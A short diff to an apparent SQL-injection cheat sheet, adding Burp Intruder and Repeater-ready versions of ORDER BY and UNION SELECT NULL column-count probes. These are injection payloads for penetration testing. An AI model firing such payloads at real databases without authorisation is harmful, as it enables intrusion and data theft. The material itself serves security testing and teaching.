@@ -130,6 +130,13 @@ ORDER BY 3--
 ORDER BY 4--
 ```
 
+Here is an intruder-friendly payload:
+
+```sql
+ORDER BY §1§--
+```
+
+
 Or just with `UNION SELECT` with `NULL`s comma-separated:
 
 ```sql
@@ -137,6 +144,12 @@ UNION SELECT NULL--
 UNION SELECT NULL,NULL--
 UNION SELECT NULL,NULL,NULL--
 UNION SELECT NULL,NULL,NULL,NULL--
+```
+
+Here is a repeater-friendly payload:
+
+```sql
+UNION SELECT NULL--
 ```
 
 > Test both methods and look for either verbose errors or behaviour changes
